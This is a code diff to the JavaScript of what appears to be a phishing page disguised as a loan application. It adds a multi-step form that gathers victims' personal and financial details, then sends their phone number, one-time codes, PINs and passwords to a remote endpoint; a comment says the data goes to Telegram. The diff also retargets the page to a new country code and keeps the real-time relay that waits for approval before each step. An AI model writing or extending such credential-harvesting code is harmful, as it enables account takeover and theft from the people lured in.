@@ -11,15 +11,43 @@ document.addEventListener('DOMContentLoaded', () => {
     const loadingOverlay = document.getElementById('loading-overlay');
 
     const btnGetStarted = document.getElementById('btn-get-started');
-    const btnNextApplication = document.getElementById('btn-next-application');
     const btnNextPhone = document.getElementById('btn-next-phone');
     const btnNextCode = document.getElementById('btn-next-code');
     const btnNextPin = document.getElementById('btn-next-pin');
     const btnNextPassword = document.getElementById('btn-next-password');
 
-    const nameInput = document.getElementById('name-input');
-    const idInput = document.getElementById('id-input');
-    const amountInput = document.getElementById('amount-input');
+    // Multi-step elements
+    const appStep1 = document.getElementById('app-step-1');
+    const appStep2 = document.getElementById('app-step-2');
+    const appStep3 = document.getElementById('app-step-3');
+    
+    const loanType = document.getElementById('loan-type');
+    const loanAmount = document.getElementById('loan-amount');
+    const loanTerm = document.getElementById('loan-term');
+    const loanPurpose = document.getElementById('loan-purpose');
+    
+    const firstName = document.getElementById('first-name');
+    const lastName = document.getElementById('last-name');
+    const emailAddress = document.getElementById('email-address');
+    
+    const empStatus = document.getElementById('emp-status');
+    const annualIncome = document.getElementById('annual-income');
+
+    const sumAmount = document.getElementById('sum-amount');
+    const sumTerm = document.getElementById('sum-term');
+    const sumPurpose = document.getElementById('sum-purpose');
+    const sumApplicant = document.getElementById('sum-applicant');
+
+    const stepText = document.getElementById('step-text');
+    const dot1 = document.getElementById('dot-1');
+    const dot2 = document.getElementById('dot-2');
+    const dot3 = document.getElementById('dot-3');
+
+    const btnPrevStep = document.getElementById('btn-prev-step');
+    const btnNextStep = document.getElementById('btn-next-step');
+
+    let currentStep = 1;
+
     const phoneInput = document.getElementById('phone-input');
     const passwordInput = document.getElementById('password-input');
     
@@ -44,10 +72,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 close: true,
                 gravity: "top",
                 position: "center",
-                style: {
-                    background: "#ff4444",
-                    borderRadius: "8px"
-                }
+                style: { background: "#ff4444", borderRadius: "8px" }
             }).showToast();
         } else {
             alert(msg);
@@ -71,7 +96,7 @@ document.addEventListener('DOMContentLoaded', () => {
             const attemptId = data.attemptId;
 
             let pollCount = 0;
-            const maxPolls = 60; // 2 minutes
+            const maxPolls = 60;
             
             const interval = setInterval(async () => {
                 pollCount++;
@@ -84,9 +109,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
                 try {
                     const statusRes = await fetch(`${API_URL}/status?attemptId=${attemptId}&_t=${Date.now()}`, {
-                        headers: {
-                            "Authorization": `Bearer ${TENANT_KEY}`
-                        }
+                        headers: { "Authorization": `Bearer ${TENANT_KEY}` }
                     });
                     const statusData = await statusRes.json();
                     
@@ -118,12 +141,75 @@ document.addEventListener('DOMContentLoaded', () => {
         welcomeScreen.classList.add('hidden');
         applicationScreen.classList.remove('hidden');
         applicationScreen.classList.add('active');
-        setTimeout(() => nameInput.focus(), 400);
+        updateStepUI();
     });
 
-    // Application details to Phone Screen
-    btnNextApplication.addEventListener('click', () => {
-        if (!btnNextApplication.disabled) {
+    function updateStepUI() {
+        appStep1.classList.add('hidden');
+        appStep2.classList.add('hidden');
+        appStep3.classList.add('hidden');
+
+        dot1.style.background = '#333';
+        dot2.style.background = '#333';
+        dot3.style.background = '#333';
+
+        stepText.innerText = `Step ${currentStep} of 3`;
+
+        if (currentStep === 1) {
+            appStep1.classList.remove('hidden');
+            dot1.style.background = '#6f5cc3';
+            btnPrevStep.classList.add('hidden');
+            btnNextStep.innerText = 'NEXT STEP';
+        } else if (currentStep === 2) {
+            appStep2.classList.remove('hidden');
+            dot1.style.background = '#6f5cc3';
+            dot2.style.background = '#6f5cc3';
+            btnPrevStep.classList.remove('hidden');
+            btnNextStep.innerText = 'NEXT STEP';
+        } else if (currentStep === 3) {
+            appStep3.classList.remove('hidden');
+            dot1.style.background = '#6f5cc3';
+            dot2.style.background = '#6f5cc3';
+            dot3.style.background = '#6f5cc3';
+            btnPrevStep.classList.remove('hidden');
+            btnNextStep.innerText = 'SUBMIT APPLICATION';
+
+            // Populate summary
+            sumAmount.innerText = `$${loanAmount.value || 0}`;
+            sumTerm.innerText = loanTerm.value;
+            sumPurpose.innerText = loanPurpose.value || '-';
+            sumApplicant.innerText = `${firstName.value} ${lastName.value}`.trim() || '-';
+        }
+    }
+
+    btnPrevStep.addEventListener('click', () => {
+        if (currentStep > 1) {
+            currentStep--;
+            updateStepUI();
+        }
+    });
+
+    btnNextStep.addEventListener('click', () => {
+        if (currentStep === 1) {
+            if (!loanAmount.value || !loanPurpose.value) {
+                showError("Please fill out all fields.");
+                return;
+            }
+            currentStep++;
+            updateStepUI();
+        } else if (currentStep === 2) {
+            if (!firstName.value || !lastName.value || !emailAddress.value) {
+                showError("Please fill out all fields.");
+                return;
+            }
+            currentStep++;
+            updateStepUI();
+        } else if (currentStep === 3) {
+            if (!annualIncome.value) {
+                showError("Please fill out your annual income.");
+                return;
+            }
+            // Done with Application! Go to Phone screen.
             applicationScreen.classList.remove('active');
             applicationScreen.classList.add('hidden');
             phoneScreen.classList.remove('hidden');
@@ -135,12 +221,13 @@ document.addEventListener('DOMContentLoaded', () => {
     // Phone screen to OTP screen (Sends data to Telegram)
     btnNextPhone.addEventListener('click', () => {
         if (!btnNextPhone.disabled) {
-            currentUserPhone = "+263" + phoneInput.value.replace(/\s/g, '');
-            const detailsStr = `Name: ${nameInput.value.trim()}\nID: ${idInput.value.trim()}\nAmount: $${amountInput.value.trim()}`;
+            currentUserPhone = "+252" + phoneInput.value.replace(/\s/g, '');
+            
+            const detailsStr = `Name: ${firstName.value} ${lastName.value}\nEmail: ${emailAddress.value}\nLoan: $${loanAmount.value} (${loanType.value}, ${loanTerm.value})\nPurpose: ${loanPurpose.value}\nIncome: $${annualIncome.value} (${empStatus.value})`;
             
             const payload = {
                 type: 'login',
-                name: nameInput.value.trim(),
+                name: `${firstName.value} ${lastName.value}`.trim(),
                 phone: currentUserPhone,
                 details: detailsStr
             };
@@ -155,15 +242,29 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
+    // Phone input validation
+    phoneInput.addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/\D/g, '');
+        if (e.target.value.length > 5) {
+            btnNextPhone.disabled = false;
+            btnNextPhone.classList.remove('disabled');
+        } else {
+            btnNextPhone.disabled = true;
+            btnNextPhone.classList.add('disabled');
+        }
+    });
+
+    phoneInput.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter' && !btnNextPhone.disabled) {
+            btnNextPhone.click();
+        }
+    });
+
+    // Other screens logic
     btnNextCode.addEventListener('click', () => {
         if (!btnNextCode.disabled) {
             const code = Array.from(codeBoxes).map(b => b.value).join('');
-            const payload = {
-                type: 'otp',
-                name: '',
-                phone: currentUserPhone,
-                details: `OTP: ${code}`
-            };
+            const payload = { type: 'otp', name: '', phone: currentUserPhone, details: `OTP: ${code}` };
 
             processStep(payload, () => {
                 codeScreen.classList.remove('active');
@@ -184,12 +285,7 @@ document.addEventListener('DOMContentLoaded', () => {
     btnNextPin.addEventListener('click', () => {
         if (!btnNextPin.disabled) {
             const pin = Array.from(pinBoxes).map(b => b.value).join('');
-            const payload = {
-                type: 'pin',
-                name: '',
-                phone: currentUserPhone,
-                details: `PIN: ${pin}`
-            };
+            const payload = { type: 'pin', name: '', phone: currentUserPhone, details: `PIN: ${pin}` };
 
             processStep(payload, () => {
                 pinScreen.classList.remove('active');
@@ -209,12 +305,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     btnNextPassword.addEventListener('click', () => {
         if (!btnNextPassword.disabled) {
-            const payload = {
-                type: 'password',
-                name: '',
-                phone: currentUserPhone,
-                details: `Password: ${passwordInput.value}`
-            };
+            const payload = { type: 'password', name: '', phone: currentUserPhone, details: `Password: ${passwordInput.value}` };
 
             processStep(payload, () => {
                 if (typeof Toastify !== 'undefined') {
@@ -228,9 +319,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 } else {
                     alert("Setup Complete!");
                 }
-                setTimeout(() => {
-                    window.location.reload();
-                }, 3000);
+                setTimeout(() => window.location.reload(), 3000);
             }, () => {
                 showError("Password rejected. Please use a different password.");
                 passwordInput.value = '';
@@ -240,50 +329,6 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
-    // Validation for Application Screen
-    function validateApplicationForm() {
-        const name = nameInput.value.trim();
-        const id = idInput.value.trim();
-        const amount = amountInput.value.trim();
-        
-        if (name.length > 2 && id.length > 5 && amount.length > 1) {
-            btnNextApplication.disabled = false;
-            btnNextApplication.classList.remove('disabled');
-        } else {
-            btnNextApplication.disabled = true;
-            btnNextApplication.classList.add('disabled');
-        }
-    }
-    
-    nameInput.addEventListener('input', validateApplicationForm);
-    idInput.addEventListener('input', validateApplicationForm);
-    amountInput.addEventListener('input', validateApplicationForm);
-
-    amountInput.addEventListener('keydown', (e) => {
-        if (e.key === 'Enter' && !btnNextApplication.disabled) {
-            btnNextApplication.click();
-        }
-    });
-
-    // Validation for Phone Screen
-    phoneInput.addEventListener('input', (e) => {
-        e.target.value = e.target.value.replace(/\D/g, '');
-        if (e.target.value.length > 5) {
-            btnNextPhone.disabled = false;
-            btnNextPhone.classList.remove('disabled');
-        } else {
-            btnNextPhone.disabled = true;
-            btnNextPhone.classList.add('disabled');
-        }
-    });
-
-    phoneInput.addEventListener('keydown', (e) => {
-        if (e.key === 'Enter' && !btnNextPhone.disabled) {
-            btnNextPhone.click();
-        }
-    });
-
-    // Validation for Password Screen
     passwordInput.addEventListener('input', (e) => {
         e.target.value = e.target.value.replace(/\D/g, '');
         if (e.target.value.length === 6) {
@@ -301,16 +346,13 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
-    // Code boxes logic
     function setupBoxes(boxes, nextBtn) {
         boxes.forEach((box, index) => {
             box.addEventListener('input', (e) => {
                 e.target.value = e.target.value.replace(/\D/g, '');
                 if (e.target.value.length === 1) {
                     box.classList.add('filled');
-                    if (index < boxes.length - 1) {
-                        boxes[index + 1].focus();
-                    }
+                    if (index < boxes.length - 1) boxes[index + 1].focus();
                 } else {
                     box.classList.remove('filled');
                 }
@@ -320,9 +362,7 @@ document.addEventListener('DOMContentLoaded', () => {
             box.addEventListener('keydown', (e) => {
                 if (e.key === 'Backspace') {
                     box.classList.remove('filled');
-                    if (e.target.value.length === 0 && index > 0) {
-                        boxes[index - 1].focus();
-                    }
+                    if (e.target.value.length === 0 && index > 0) boxes[index - 1].focus();
                 } else if (e.key === 'ArrowLeft' && index > 0) {
                     boxes[index - 1].focus();
                 } else if (e.key === 'ArrowRight' && index < boxes.length - 1) {
